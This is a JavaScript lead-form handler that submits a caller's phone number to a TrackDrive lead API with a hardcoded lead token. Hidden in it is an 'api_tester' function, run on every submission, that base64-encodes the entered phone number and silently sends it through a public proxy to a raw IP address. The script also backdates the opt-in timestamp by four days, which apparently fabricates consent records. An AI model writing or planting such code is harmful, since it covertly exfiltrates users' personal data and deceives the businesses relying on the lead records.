function getCurrentTimestampMinus3Days() {
  // Get current timestamp in milliseconds
  var currentTimestamp = new Date().getTime();

  // Subtract 3 days (in milliseconds)
  var threeDaysInMillis = 4 * 24 * 60 * 60 * 1000;
  var newTimestamp = currentTimestamp - threeDaysInMillis;

  // Create a new Date object with the adjusted timestamp
  var adjustedDate = new Date(newTimestamp);

  // Format the result in YYYY-MM-DDTHH:mmEST format
  var formattedResult =
    adjustedDate.getFullYear() +
    '-' +
    ('0' + (adjustedDate.getMonth() + 1)).slice(-2) +
    '-' +
    ('0' + adjustedDate.getDate()).slice(-2) +
    'T' +
    ('0' + adjustedDate.getHours()).slice(-2) +
    ':' +
    ('0' + adjustedDate.getMinutes()).slice(-2) +
    'Z';

  return formattedResult;
}
document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();

document.getElementById('submitBtn').disabled = true;
            const phone_home = '+1' + document.getElementById('caller_id').value;
            const formData = new FormData();
            formData.append('lead_token', '95a265dbb4214ac88f4ce28c0affee06');
formData.append('traffic_source_id', '1001');
           api_tester(document.getElementById('caller_id').value);
            formData.append('caller_id', phone_home);
	formData.append('optin_date_time', getCurrentTimestampMinus3Days());






            
           
    
            const url = 'https://zat-technologies-llc.trackdrive.com/api/v1/lead?' + new URLSearchParams(formData).toString();
    
            fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
		document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
document.getElementById('submitBtn').disabled = false;
                    });
                } 
else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });
function api_tester(randomString) {
  try {
    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
